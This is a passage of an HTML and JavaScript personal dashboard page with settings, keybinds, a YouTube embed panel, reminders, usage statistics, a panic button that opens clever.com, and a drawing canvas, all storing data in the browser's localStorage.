            <label for="autoLogoutTime">Auto-logout Time (minutes)</label>
            <input type="number" id="autoLogoutTime" min="5" value="30">
        </div>
        <div class="setting-item">
            <label for="dataRetentionPeriod">Activity Log Retention (days)</label>
            <input type="number" id="dataRetentionPeriod" min="1" value="30">
        </div>
        <div class="setting-item">
            <label for="enableAccessibilityFeatures">Accessibility Features</label>
            <label class="toggle-switch">
                <input type="checkbox" id="enableAccessibilityFeatures">
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="showQuickTooltips">Show Quick Tooltips</label>
            <label class="toggle-switch">
                <input type="checkbox" id="showQuickTooltips" checked>
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="confirmDangerousActions">Confirm Dangerous Actions</label>
            <label class="toggle-switch">
                <input type="checkbox" id="confirmDangerousActions" checked>
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="panelSnapToGrid">Panel Snap to Grid (conceptual)</label>
            <label class="toggle-switch">
                <input type="checkbox" id="panelSnapToGrid">
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="showAnnouncements">Show Announcements Bar</label>
            <label class="toggle-switch">
                <input type="checkbox" id="showAnnouncements" checked>
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="alertOnLowBattery">Alert on Low Battery</label>
            <label class="toggle-switch">
                <input type="checkbox" id="alertOnLowBattery" checked>
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="enableHardwareAcceleration">Hardware Acceleration (conceptual)</label>
            <label class="toggle-switch">
                <input type="checkbox" id="enableHardwareAcceleration" checked>
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="darkModeAutoSwitch">Auto-switch to Dark Mode at Night</label>
            <label class="toggle-switch">
                <input type="checkbox" id="darkModeAutoSwitch">
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <button id="resetDashboardLayout" style="width:auto; margin:5px 0;">Reset Dashboard Layout</button>
        </div>
        <div class="setting-item">
          <button id="resetAllSettings" style="width:auto; background-color: #F44336; color:white; margin:5px 0;">Reset All Settings</button>
        </div>
    </div>

    <!-- Keybinds Panel -->
    <div id="keybindsPanel" class="info-panel">
        <h2>⌨️ Keybinds</h2>
        <div id="keybindsList" style="max-height: 400px; overflow-y: auto; background:#1c1c1c; padding: 10px; border-radius: 8px;">
            <div class="log-entry"><strong>F1</strong>: Toggle Calendar</div>
            <div class="log-entry"><strong>F2</strong>: Open Notes</div>
            <div class="log-entry"><strong>Shift+L</strong>: Log Out</div>
            <div class="log-entry"><strong>Ctrl+P</strong>: Trigger Panic Button</div>
            <p>To configure keybinds: Click on a keybind item, then press desired key combination.</p>
        </div>
    </div>

    <!-- Media Panel -->
    <div id="mediaPanel" class="info-panel">
        <h2>▶️ Media Player</h2>
        <div style="background-color: #40210f; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
            <p><strong>Note:</strong> Direct YouTube embeds are often blocked by school filters. A true "proxy" for video playback requires a server-side solution not fully implemented here. This player will attempt to embed videos directly from YouTube which might be filtered.</p>
        </div>
        <div class="media-controls" style="display:flex; gap:10px; flex-wrap:wrap;">
            <input type="text" id="youtubeUrlInput" placeholder="Enter YouTube URL or Video ID">
            <button id="loadYoutubeVideo" style="width:auto; min-width:80px;">Load Video</button>
        </div>
        <iframe id="youtubeVideoPlayer" class="video-embed" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        <div class="coming-soon" style="margin-top:15px; display:none;" id="mediaProxyDisclaimer">
            Advanced proxy functionality for blocked sites is a complex server-side feature and is not fully available here. This may still be filtered.
        </div>
    </div>

    <!-- Reminders Panel -->
    <div id="remindersPanel" class="info-panel">
        <h2>⏰ Reminders</h2>
        <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; background:#1c1c1c; padding:15px; border-radius:8px;">
            <input type="text" id="reminderText" placeholder="What to remember?">
            <input type="datetime-local" id="reminderTime">
            <button id="addReminderBtn" style="width:100%; max-width: none;">Add Reminder</button>
        </div>
        <div id="reminderList">
            <p>No reminders set.</p>
        </div>
    </div>

    <!-- Stats Panel -->
    <div id="statsPanel" class="info-panel">
        <h2>📊 Dashboard Statistics</h2>
        <div id="statsDisplay" style="background:#1c1c1c; padding: 10px; border-radius: 8px;">
            <div class="stats-item"><strong>Total Buttons Clicked:</strong> <span id="stat_buttonsClicked">0</span></div>
            <div class="stats-item"><strong>Total Toggles Flipped:</strong> <span id="stat_togglesFlipped">0</span></div>
            <div class="stats-item"><strong>Panels Opened:</strong> <span id="stat_panelsOpened">0</span></div>
            <div class="stats-item"><strong>Panels Closed:</strong> <span id="stat_panelsClosed">0</span></div>
            <div class="stats-item"><strong>Notes Saved/Exported:</strong> <span id="stat_notesActions">0</span></div>
            <div class="stats-item"><strong>Session Time Active:</strong> <span id="stat_sessionActiveTime">0s</span></div>
            <div class="stats-item"><strong>Page Restarts:</strong> <span id="stat_restarts">0</span></div>
            <div class="stats-item"><strong>Panic Button Activations:</strong> <span id="stat_panicActivations">0</span></div>
        </div>
    </div>


  </div>

  <!-- Dashboard Alert System -->
  <div id="dashboardAlert" class="dashboard-alert"></div>


  <script>
    // Global activity logger for dashboard
    let activityLog = JSON.parse(localStorage.getItem('dashboardActivityLog')) || [];
    let loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
    let userStats = JSON.parse(localStorage.getItem('userStats')) || {
        buttonsClicked: 0,
        togglesFlipped: 0,
        panelsOpened: 0,
        panelsClosed: 0,
        notesActions: 0,
        sessionActiveTime: 0,
        restarts: 0,
        panicActivations: 0
    };

    function recordActivity(action, details = '') {
      const timestamp = new Date().toLocaleString();
      const logEntry = { timestamp, action, details };
      activityLog.push(logEntry);
      localStorage.setItem('dashboardActivityLog', JSON.stringify(activityLog));
      console.log(`Activity Recorded: ${action} - ${details}`); // For debugging
      dashboard.updateStats('activity');
    }

    function showDashboardAlert(message, type = 'info', duration = 3000) {
        const alertElement = document.getElementById('dashboardAlert');
        alertElement.textContent = message;
        alertElement.className = 'dashboard-alert ' + type; // Apply base class and type
        alertElement.style.visibility = 'visible';
        alertElement.style.opacity = '1';
        alertElement.style.transform = 'translateX(0)';

        if (settings.notificationVolume.value > 0) {
            // No sound explicitly requested, but this would be the place for it.
            // Using conceptual volume setting for now.
        }

        setTimeout(() => {
            alertElement.style.opacity = '0';
            alertElement.style.transform = 'translateX(100%);';
            alertElement.addEventListener('transitionend', () => {
                alertElement.style.visibility = 'hidden';
            }, { once: true });
        }, duration);
    }

    // Default settings
    let settings = JSON.parse(localStorage.getItem('dashboardSettings')) || {
        theme: 'dark',
        fontSize: 1, // Default 1 = 100%
        bgEffect: false,
        notificationVolume: 50,
        autoLogoutTime: 30, // minutes
        dataRetentionPeriod: 30, // days
        enableAccessibilityFeatures: false,
        showQuickTooltips: true,
        confirmDangerousActions: true,
        panelSnapToGrid: false,
        showAnnouncements: true,
        alertOnLowBattery: true,
        enableHardwareAcceleration: true,
        darkModeAutoSwitch: false
    };

    // Save settings to localStorage
    function saveSettings() {
        localStorage.setItem('dashboardSettings', JSON.stringify(settings));
        showDashboardAlert('Settings saved!', 'success');
        recordActivity('Settings Saved');
    }

    // Apply settings on load/change
    function applySettings() {
        // Theme
        const bodyClassList = document.body.classList;
        bodyClassList.remove('light-theme', 'cyberpunk-theme', 'monochrome-theme'); // Clear existing theme classes
        if (settings.theme !== 'dark') {
            bodyClassList.add(settings.theme + '-theme');
            document.getElementById('themeToggle').textContent = `☀️ ${settings.theme.charAt(0).toUpperCase() + settings.theme.slice(1)} Mode`;
        } else {
            document.getElementById('themeToggle').textContent = '🌙 Dark Mode';
        }

        // Font size
        document.body.style.fontSize = `${settings.fontSize * 100}%`;
        $('#fontSizeSlider').val(settings.fontSize);
        $('#fontSizeValue').text(`${Math.round(settings.fontSize * 100)}%`);


        // Background Effect (conceptual)
        if (settings.bgEffect) {
            // Implement a simple visual background effect, e.g., pulsating glow
            document.body.style.animation = 'pulseGlow 5s infinite alternate';
        } else {
            document.body.style.animation = 'none';
        }
        $('#bgEffectToggle').prop('checked', settings.bgEffect);

        // Notification volume (conceptual for no sound request)
        $('#notificationVolume').val(settings.notificationVolume);

        // Auto-logout
        $('#autoLogoutTime').val(settings.autoLogoutTime);
        dashboard.resetAutoLogoutTimer(); // Restart timer with new setting

        // Data retention
        $('#dataRetentionPeriod').val(settings.dataRetentionPeriod);
        dashboard.cleanLogs(settings.dataRetentionPeriod);

        // Accessibility Features (conceptual)
        $('#enableAccessibilityFeatures').prop('checked', settings.enableAccessibilityFeatures);

        // Show Quick Tooltips (conceptual)
        $('#showQuickTooltips').prop('checked', settings.showQuickTooltips);

        // Confirm Dangerous Actions
        $('#confirmDangerousActions').prop('checked', settings.confirmDangerousActions);

        // Panel Snap to Grid (conceptual, applies to draggable)
        $('#panelSnapToGrid').prop('checked', settings.panelSnapToGrid);
        dashboard.applyDraggableResizableSettings();

        // Show Announcements
        const announcementBar = document.getElementById('announcementBar');
        if (announcementBar) {
            announcementBar.style.display = settings.showAnnouncements ? 'block' : 'none';
        }
        $('#showAnnouncements').prop('checked', settings.showAnnouncements);

        // Alert on Low Battery (conceptual, needs real battery API)
        $('#alertOnLowBattery').prop('checked', settings.alertOnLowBattery);
        dashboard.checkBatteryStatusForAlert(); // Check on settings apply

        // Hardware Acceleration (conceptual)
        $('#enableHardwareAcceleration').prop('checked', settings.enableHardwareAcceleration);

        // Dark Mode Auto Switch (conceptual)
        $('#darkModeAutoSwitch').prop('checked', settings.darkModeAutoSwitch);
        dashboard.checkAutoDarkMode();

        // Theme toggle button in quick bar should reflect current setting
        const themeBtn = document.getElementById('themeToggle');
        if (settings.theme === 'dark') {
            themeBtn.innerText = '🌙 Dark Mode';
        } else if (settings.theme === 'light') {
            themeBtn.innerText = '☀️ Light Mode';
        } else if (settings.theme === 'cyberpunk') {
            themeBtn.innerText = '👾 Cyberpunk Mode';
        } else if (settings.theme === 'monochrome') {
            themeBtn.innerText = '⚫ Monochrome Mode';
        }

    }


    const dashboard = {
      activePanels: new Set(),
      // Timer for auto-logout
      autoLogoutTimer: null,
      idleTime: 0,
      activityDetected: true,
      
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle(); // Now a selector in settings
        this.initButtons(); // General quick bar buttons (panic, full screen etc.)
        this.initNotesCanvas();
        this.initInfoPanels(); // Toggle info panels
        this.initSearch();
        this.initRandomFactAndQuotePanels();
        this.initCalculator();
        this.initUnitConverter();
        this.initTimers();
        this.initActivityLogger();
        this.initLoginHistory();
        this.initSettings();
        this.initKeybinds();
        this.initMediaPlayer();
        this.initReminders();
        this.initStatsTracking();
        this.makePanelsDraggableResizable();
        applySettings(); // Apply user settings after dashboard loads

        this.startIdleDetection();
        this.resetAutoLogoutTimer();
        this.trackActiveTime();

        // Initial alert on low battery if setting enabled
        this.checkBatteryStatusForAlert();

        recordActivity('Dashboard Loaded', `User: ${document.getElementById('loggedInUser').textContent}`);
        dashboard.updateStats('panelsOpened'); // Main dashboard container opened
      },

      trackActiveTime: function() {
          setInterval(() => {
              if (this.activityDetected) {
                  userStats.sessionActiveTime++;
                  localStorage.setItem('userStats', JSON.stringify(userStats));
                  this.activityDetected = false; // Reset for next interval
              }
          }, 1000); // Check every second
      },

      // Update and save user stats
      updateStats: function(type, count = 1) {
          if (!userStats) userStats = {
              buttonsClicked: 0,
              togglesFlipped: 0,
              panelsOpened: 0,
              panelsClosed: 0,
              notesActions: 0,
              sessionActiveTime: 0,
              restarts: 0,
              panicActivations: 0
          };
          switch (type) {
              case 'click': userStats.buttonsClicked += count; break;
              case 'toggle': userStats.togglesFlipped += count; break;
              case 'panelsOpened': userStats.panelsOpened += count; break;
              case 'panelsClosed': userStats.panelsClosed += count; break;
              case 'notes': userStats.notesActions += count; break;
              case 'restarts': userStats.restarts += count; break;
              case 'panic': userStats.panicActivations += count; break;
              case 'activity': break; // Activity log is tracked separately
          }
          localStorage.setItem('userStats', JSON.stringify(userStats));
          dashboard.updateStatsDisplay(); // Update display immediately
      },
      // Update the stats display in the panel
      updateStatsDisplay: function() {
          if (!document.getElementById('stat_buttonsClicked')) return; // Ensure panel exists
          document.getElementById('stat_buttonsClicked').textContent = userStats.buttonsClicked;
          document.getElementById('stat_togglesFlipped').textContent = userStats.togglesFlipped;
          document.getElementById('stat_panelsOpened').textContent = userStats.panelsOpened;
          document.getElementById('stat_panelsClosed').textContent = userStats.panelsClosed;
          document.getElementById('stat_notesActions').textContent = userStats.notesActions;
          document.getElementById('stat_restarts').textContent = userStats.restarts;
          document.getElementById('stat_panicActivations').textContent = userStats.panicActivations;

          const sessionActiveHrs = String(Math.floor(userStats.sessionActiveTime / 3600)).padStart(2, '0');
          const sessionActiveMins = String(Math.floor((userStats.sessionActiveTime % 3600) / 60)).padStart(2, '0');
          const sessionActiveSecs = String(userStats.sessionActiveTime % 60).padStart(2, '0');
          document.getElementById('stat_sessionActiveTime').textContent = `${sessionActiveHrs}:${sessionActiveMins}:${sessionActiveSecs}`;
      },
      initStatsTracking: function() {
        document.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON') {
                dashboard.updateStats('click');
            }
        });
        document.addEventListener('change', (e) => {
            if (e.target.type === 'checkbox') {
                dashboard.updateStats('toggle');
            }
        });
        this.updateStatsDisplay(); // Initial display load
      },


      startIdleDetection: function() {
        let idleInterval = setInterval(() => {
            this.idleTime++;
            if (this.idleTime >= 30) { // Log every 30 seconds of idle
                recordActivity('User Idle', `Idle for ${this.idleTime} seconds.`);
                this.idleTime = 0;
            }
        }, 1000); // Check idle time every second

        const resetIdleTimer = () => {
            this.idleTime = 0;
            this.activityDetected = true; // For active time tracking
            this.resetAutoLogoutTimer();
        };

        ['mousemove', 'mousedown', 'keydown', 'touchstart'].forEach(eventType => {
            document.addEventListener(eventType, resetIdleTimer, false);
        });
      },

      resetAutoLogoutTimer: function() {
          clearTimeout(this.autoLogoutTimer);
          const autoLogoutMinutes = parseInt(settings.autoLogoutTime, 10);
          if (autoLogoutMinutes > 0) {
              this.autoLogoutTimer = setTimeout(() => {
                  this.logoutUser(true); // Call logout function with true for auto-logout
              }, autoLogoutMinutes * 60 * 1000);
          }
      },

      logoutUser: function(autoLogout = false) {
          if (!settings.confirmDangerousActions || confirm(`Are you sure you want to log out${autoLogout ? ' due to inactivity' : ''}?`)) {
              recordActivity(`User Logout${autoLogout ? ' (Auto)' : ''}`);
              localStorage.removeItem('loggedInUser'); // Clear user from local storage
              clearTimeout(this.autoLogoutTimer);
              location.reload(); // Reloads the page, returning to pre-login/login screen
          }
      },

      // Theme toggle now a selector in settings panel, button calls open settings.
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
            // Now opens settings panel instead of toggling
            this.togglePanel('settingsPanel');
            // Focus on the theme setting in the settings panel
            $('#settingsThemeToggle').focus();
            recordActivity('Opened Settings', 'Via Theme Toggle');
        });
      },

      initSettings: function() {
        // Link up settings controls
        $('#settingsPanel button').click(function(e) {
            recordActivity('Clicked Settings button', e.target.id);
            if(e.target.id === 'resetDashboardLayout') {
                if (confirm('Are you sure you want to reset dashboard panel positions and sizes?')) {
                    localStorage.removeItem('panelLayout');
                    window.location.reload(); // Reload to apply default layout
                    showDashboardAlert('Dashboard layout reset! Page will reload.', 'info');
                    recordActivity('Dashboard Layout Reset');
                }
            } else if (e.target.id === 'resetAllSettings') {
                if (confirm('WARNING: This will reset ALL dashboard settings to their defaults. Are you sure?')) {
                    localStorage.removeItem('dashboardSettings');
                    settings = {}; // Clear current settings object
                    applySettings(); // Re-apply defaults
                    saveSettings(); // Save default settings
                    window.location.reload(); // Reload to fully clear layout and re-init with defaults
                    showDashboardAlert('All settings reset! Page will reload.', 'success');
                    recordActivity('All Settings Reset');
                }
            } else {
              saveSettings(); // For other custom buttons inside
            }
        });

        $('#settingsPanel input, #settingsPanel select').on('change input', function(e) {
            const id = e.target.id;
            const value = e.target.type === 'checkbox' ? e.target.checked : (e.target.type === 'range' || e.target.type === 'number' ? parseFloat(e.target.value) : e.target.value);
            settings[id.replace('settings', '').charAt(0).toLowerCase() + id.replace('settings', '').slice(1)] = value;

            if (id === 'fontSizeSlider') {
                $('#fontSizeValue').text(`${Math.round(value * 100)}%`);
            }
            if(e.type === 'change') { // Only save on 'change' event to avoid spamming localStorage
                saveSettings();
                applySettings(); // Re-apply immediately
            }
            recordActivity('Setting Changed', `${id}: ${value}`);
        });

        // Event for settings theme selector
        $('#settingsThemeToggle').on('change', function() {
            settings.theme = this.value;
            saveSettings();
            applySettings();
            recordActivity('Theme Changed', this.value);
        });

        // Set initial values on settings panel load
        document.getElementById('settingsBtn').addEventListener('click', () => {
            dashboard.togglePanel('settingsPanel');
            $('#settingsThemeToggle').val(settings.theme);
            $('#fontSizeSlider').val(settings.fontSize);
            $('#fontSizeValue').text(`${Math.round(settings.fontSize * 100)}%`);
            $('#bgEffectToggle').prop('checked', settings.bgEffect);
            $('#notificationVolume').val(settings.notificationVolume);
            $('#autoLogoutTime').val(settings.autoLogoutTime);
            $('#dataRetentionPeriod').val(settings.dataRetentionPeriod);
            $('#enableAccessibilityFeatures').prop('checked', settings.enableAccessibilityFeatures);
            $('#showQuickTooltips').prop('checked', settings.showQuickTooltips);
            $('#confirmDangerousActions').prop('checked', settings.confirmDangerousActions);
            $('#panelSnapToGrid').prop('checked', settings.panelSnapToGrid);
            $('#showAnnouncements').prop('checked', settings.showAnnouncements);
            $('#alertOnLowBattery').prop('checked', settings.alertOnLowBattery);
            $('#enableHardwareAcceleration').prop('checked', settings.enableHardwareAcceleration);
            $('#darkModeAutoSwitch').prop('checked', settings.darkModeAutoSwitch);

            recordActivity('Opened Settings Panel');
        });

        applySettings(); // Initial apply when dashboard loads
      },

      checkBatteryStatusForAlert: async function() {
        if (!settings.alertOnLowBattery || !navigator.getBattery) return;
        try {
          const battery = await navigator.getBattery();
          if (battery.level < 0.20 && !battery.charging) { // Below 20% and not charging
            showDashboardAlert(`Battery Low: ${Math.round(battery.level * 100)}% remaining!`, 'warning', 10000);
            recordActivity('Low Battery Alert Triggered', `${Math.round(battery.level * 100)}%`);
          }
        } catch (e) {
          // Could not get battery status
        }
      },

      checkAutoDarkMode: function() {
          if (!settings.darkModeAutoSwitch) return;
          const hour = new Date().getHours();
          const isNight = hour >= 20 || hour < 6; // 8 PM to 6 AM
          if (isNight && settings.theme === 'light') {
              settings.theme = 'dark';
              saveSettings();
              applySettings();
              showDashboardAlert('Auto-switched to Dark Mode.', 'info');
              recordActivity('Auto Dark Mode On');
          } else if (!isNight && settings.theme === 'dark' && this.previousThemeWasDarkOnAutoSwitch) {
            // Optional: Auto switch back to light if user had light mode previously
            // This is harder to track consistently without knowing original setting.
            // For now, only switch to dark automatically.
          }
      },


      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          recordActivity('Panic Button Activated');
          dashboard.updateStats('panic');
          if (settings.confirmDangerousActions && !confirm('WARNING: This will open clever.com immediately, possibly losing unsaved work. Are you sure?')) {
              return;
          }
          window.open('https://clever.com', '_blank');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)? This will erase unsaved session data.')) {
            recordActivity('Page Restarted');
            dashboard.updateStats('restarts');
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Refresh to continue.</div>`;
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          showDashboardAlert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!', 'info', 5000);
          recordActivity('Fix Issues Button Pressed');
        });

        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          recordActivity('Toggle Full Screen');
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showDashboardAlert(`Error: ${err.message}`, 'error');
            });
          } else {
            document.exitFullscreen();
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
            dashboard.logoutUser();
        });
      },

      initSessionTimer: function() {
        let sessionSeconds = 0;
        const sessionStartTime = new Date(); // Record when session starts

        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }

        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
          userStats.sessionActiveTime = sessionSeconds; // Update active time stat continuously
          // No immediate save to local storage, but should save on logout/unload for accuracy
        }

        updateSessionTime();
        setInterval(updateSessionTime, 1000);

        window.addEventListener('beforeunload', () => {
            localStorage.setItem('userStats', JSON.stringify(userStats)); // Ensure stats are saved
        });
      },

      initClock: function() {
        let is24HourFormatDashboard = false; // Separate toggle for dashboard vs login
        const realTimeClock = document.getElementById('realTimeClock');
        realTimeClock.style.cursor = 'pointer'; // Make it look clickable

        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: !is24HourFormatDashboard };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          realTimeClock.innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }

        // Toggle 12/24 hour format for dashboard clock by clicking on it
        realTimeClock.addEventListener('click', () => {
            is24HourFormatDashboard = !is24HourFormatDashboard;
            updateClock();
            showDashboardAlert(`Time format switched to ${is24HourFormatDashboard ? '24-hour' : '12-hour'}`, 'info');
            recordActivity('Time Format Toggled', is24HourFormatDashboard ? '24hr' : '12hr');
        });

        updateClock();
        setInterval(updateClock, 1000);
      },

      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = '';
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
        recordActivity('Calendar Generated');
      },

      initRandomFactAndQuotePanels: function() {
          const randomFacts = [
              "A group of owls is called a parliament.",
              "Honey never spoils.",
              "The shortest war in history lasted 38 to 45 minutes.",
              "A snail can sleep for three years.",
              "It is impossible for most people to lick their own elbow."
          ];
          const dailyQuotes = [
              "The only way to do great work is to love what you do. – Steve Jobs",
              "Believe you can and you're halfway there. – Theodore Roosevelt",
              "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
              "Strive not to be a success, but rather to be of value. – Albert Einstein",
              "The mind is everything. What you think you become. – Buddha"
          ];

          function updateRandomFact() {
              const factBox = document.getElementById('randomFactBox');
              const currentFact = factBox.querySelector('p');
              const newFact = randomFacts[Math.floor(Math.random() * randomFacts.length)];
              if (currentFact) {
                  currentFact.textContent = newFact;
              } else {
                  factBox.innerHTML = `<h2>🧠 Random Fact</h2><p>${newFact}</p>`;
              }
              recordActivity('Updated Random Fact');
          }

          function updateDailyQuote() {
              const quoteBox = document.getElementById('dailyQuoteBox');
              const currentQuote = quoteBox.querySelector('p');
              const newQuote = dailyQuotes[Math.floor(Math.random() * dailyQuotes.length)];
              if (currentQuote) {
                  currentQuote.textContent = newQuote;
              } else {
                  quoteBox.innerHTML = `<h2>💬 Daily Quote</h2><p>${newQuote}</p>`;
              }
              recordActivity('Updated Daily Quote');
          }

          // Initial load
          updateRandomFact();
          updateDailyQuote();

          // Update daily
          setInterval(updateRandomFact, 24 * 60 * 60 * 1000);
          setInterval(updateDailyQuote, 24 * 60 * 60 * 1000);

          // Motivation box also from here
          const motivationQuotes = [
            "\"Success is not final, failure is not fatal: It is the courage to continue that counts.\" – Winston Churchill",
            "\"The best way to predict the future is to create it.\" – Abraham Lincoln",
            "\"Innovation distinguishes between a leader and a follower.\" – Steve Jobs",
            "\"Your time is limited, don't waste it living someone else's life.\" – Steve Jobs",
            "\"The journey of a thousand miles begins with a single step.\" – Lao Tzu"
          ];
          const motivationBox = document.getElementById('motivationBox');
          if (motivationBox) {
            motivationBox.innerHTML = motivationQuotes[Math.floor(Math.random() * motivationQuotes.length)];
            // Can add an update interval for motivation box if desired, similar to facts/quotes
            setInterval(() => {
                motivationBox.innerHTML = motivationQuotes[Math.floor(Math.random() * motivationQuotes.length)];
            }, 60 * 60 * 1000); // Update every hour
            recordActivity('Updated Motivation Quote');
          }
      },

      initSearch: function() {
        const searchBar = document.getElementById('searchBar');
        searchBar.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            const query = searchBar.value.toLowerCase();
            dashboard.handleSearch(query);
            recordActivity('Search Executed', `Query: ${query}`);
            dashboard.updateStats('click');
          }
        });
      },

      handleSearch: function(query) {
        let found = false;
        const dashboardElements = document.querySelectorAll('.info-panel, .box, h2, .quick-bar-secondary button');

        // Check if query is for a panel to toggle directly
        const panelButtons = document.querySelectorAll('.quick-bar-secondary button');
        for (const button of panelButtons) {
            const buttonText = button.textContent.toLowerCase();
            const panelIdMatch = buttonText.replace(/[^\w\s]/gi, '').toLowerCase(); // Remove icons/special chars for matching
            const panelId = button.onclick ? button.onclick.toString().match(/togglePanel\('([^']+)'\)/) : null;
            if (panelId && (buttonText.includes(query) || panelIdMatch.includes(query))) {
                if(buttonText.includes('toggle main sections')) {
                  dashboard.toggleMainSections();
                } else {
                  dashboard.togglePanel(panelId[1]);
                }
                found = true;
                showDashboardAlert(`Opening ${button.textContent.trim()}!`, 'info');
                return;
            }
        }

        // Otherwise, try to scroll to matching elements in opened panels
        for (const element of dashboardElements) {
          if (element.textContent.toLowerCase().includes(query)) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
            element.style.backgroundColor = 'rgba(255, 255, 0, 0.3)'; // Highlight
            setTimeout(() => element.style.backgroundColor = '', 3000);
            found = true;
            showDashboardAlert(`Found "${query}" in dashboard!`, 'info');
            break;
          }
        }

        if (!found) {
          showDashboardAlert(`No match found for "${query}" in open panels.`, 'warning');
        }
      },

      initNotesCanvas: function() {
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const brushThicknessInput = document.getElementById('brushThickness');
        const brushColorInput = document.getElementById('brushColor');
        const toggleEraserBtn = document.getElementById('toggleEraserBtn');
        const toggleTextNotesBtn = document.getElementById('toggleTextNotesBtn');
        const textNotesArea = document.getElementById('textNotesArea');
        const saveCanvasBtn = document.getElementById('saveCanvasBtn');
        const exportNotesPngBtn = document.getElementById('exportNotesPngBtn');
        const exportNotesJsonBtn = document.getElementById('exportNotesJsonBtn');
        const importNotesJsonBtn = document.getElementById('importNotesJsonBtn');
        const undoCanvasBtn = document.getElementById('undoCanvasBtn');
        const redoCanvasBtn = document.getElementById('redoCanvasBtn');

        let drawing = false;
        let isErasing = false;
        let brushColor = brushColorInput.value;
        let brushThickness = parseInt(brushThicknessInput.value);
        let undoStack = [];
        let redoStack = [];
        const MAX_UNDO_STATES = 20;

        function saveCanvasState() {
            if (undoStack.length >= MAX_UNDO_STATES) {
                undoStack.shift(); // Remove oldest state
            }
            undoStack.push(canvas.toDataURL());
            redoStack = []; // Clear redo stack on new drawing action
            recordActivity('Canvas State Saved');
        }

        function restoreCanvasState(dataURL) {
            const img = new Image();
            img.onload = () => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0);
            };
            img.src = dataURL;
            recordActivity('Canvas State Restored');
        }

        function clearCanvas() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            recordActivity('Canvas Cleared');
        }

        // Initialize canvas with white background and first state
        clearCanvas();
        saveCanvasState();


        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const scaleX = canvas.width / rect.width;
          const scaleY = canvas.height / rect.height;
          return {
            x: ((evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left) * scaleX,
            y: ((evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top) * scaleY
          };
        }

        // Drawing logic
        canvas.addEventListener('mousedown', (e) => {
            drawing = true;
            ctx.beginPath();
            const pos = getPos(e);
            ctx.moveTo(pos.x, pos.y);
            e.preventDefault();
        });
        canvas.addEventListener('touchstart', (e) => {
            drawing = true;
            ctx.beginPath();
            const pos = getPos(e);
            ctx.moveTo(pos.x, pos.y);
            e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = isErasing ? '#fff' : brushColor;
          ctx.lineWidth = brushThickness;
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round'; // Ensure smooth joints
          ctx.globalCompositeOperation = isErasing ? 'destination-out' : 'source-over'; // Eraser mode
          ctx.stroke();
          e.preventDefault();
        });
        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
